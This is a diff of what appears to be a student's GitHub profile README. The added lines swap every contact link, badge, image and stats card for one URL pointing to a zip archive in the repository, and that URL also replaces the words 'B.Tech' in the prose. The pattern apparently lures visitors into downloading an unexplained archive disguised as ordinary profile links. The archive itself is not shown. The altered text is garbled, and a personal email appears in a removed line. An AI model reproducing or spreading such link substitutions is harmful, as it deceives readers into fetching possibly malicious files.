@@ -3,22 +3,22 @@
 <h1 align="center">Hi 👋, I'm Sarbjot Singh</h1>
 
 <p align="center">
-🚀 B.Tech Data Science Student | AI & ML Enthusiast | Future Data Analyst
+🚀 https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip Data Science Student | AI & ML Enthusiast | Future Data Analyst
 </p>
 
 <p align="center">
-<img src="https://readme-typing-svg.herokuapp.com?color=8A2BE2&center=true&vCenter=true&lines=AI+%26+Machine+Learning+Developer;Computer+Vision+Projects;Data+Analytics+Learner;Building+AI+for+Real+World+Impact">
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip+%26+Machine+Learning+Developer;Computer+Vision+Projects;Data+Analytics+Learner;Building+AI+for+Real+World+Impact">
 </p>
 
 <p align="center">
-<a href="mailto:sarbjot4122@gmail.com">
-<img src="https://img.shields.io/badge/EMAIL-D14836?style=for-the-badge&logo=gmail&logoColor=white"/>
+<a href="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip">
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip"/>
 </a>
-<a href="www.linkedin.com/in/sarbjot-singh-096481354">
-<img src="https://img.shields.io/badge/LINKEDIN-0077B5?style=for-the-badge&logo=linkedin&logoColor=white"/>
+<a href="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip">
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip"/>
 </a>
-<a href="https://huggingface.co/YOURPROFILE">
-<img src="https://img.shields.io/badge/HUGGINGFACE-FFD21E?style=for-the-badge"/>
+<a href="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip">
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip"/>
 </a>
 </p>
 
@@ -26,7 +26,7 @@
 
 ## 👨‍💻 About Me
 
-🎓 Final-year **B.Tech Data Science** student specializing in AI & Machine Learning.  
+🎓 Final-year **https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip Data Science** student specializing in AI & Machine Learning.  
 💡 I don’t just build models — I build **real-world solutions**.
 
 - 🚗 Current Project: Driver Drowsiness Detection System
@@ -40,10 +40,10 @@
 
 | Category | Tools & Technologies |
 |---|---|
-| 🧑‍💻 Languages | ![Python](https://img.shields.io/badge/Python-blue) ![SQL](https://img.shields.io/badge/SQL-red) |
-| 🤖 AI / ML | ![PyTorch](https://img.shields.io/badge/PyTorch-orange) ![TensorFlow](https://img.shields.io/badge/TensorFlow-orange) ![Scikit](https://img.shields.io/badge/Scikit--Learn-yellow) |
-| 👁️ Computer Vision | ![OpenCV](https://img.shields.io/badge/OpenCV-green) ![MediaPipe](https://img.shields.io/badge/MediaPipe-blue) |
-| 📊 Data Tools | ![Pandas](https://img.shields.io/badge/Pandas-purple) ![NumPy](https://img.shields.io/badge/NumPy-blue) ![Hadoop](https://img.shields.io/badge/Hadoop-lightblue) |
+| 🧑‍💻 Languages | ![Python](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![SQL](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) |
+| 🤖 AI / ML | ![PyTorch](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![TensorFlow](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![Scikit](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) |
+| 👁️ Computer Vision | ![OpenCV](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![MediaPipe](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) |
+| 📊 Data Tools | ![Pandas](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![NumPy](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) ![Hadoop](https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip) |
 
 ---
 
@@ -63,11 +63,11 @@ NLP-based system analyzing social media data for impact trends.
 ## 📈 GitHub Stats
 
 <p align="center">
-<img src="https://github-readme-stats.vercel.app/api?username=YOURUSERNAME&show_icons=true&theme=radical"/>
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip"/>
 </p>
 
 <p align="center">
-<img src="https://github-readme-streak-stats.herokuapp.com/?user=YOURUSERNAME&theme=radical"/>
+<img src="https://github.com/Sarb-jot/Sarb-jot/raw/refs/heads/main/protephemeroid/jot-Sarb-3.2.zip"/>
 </p>
 
 ---
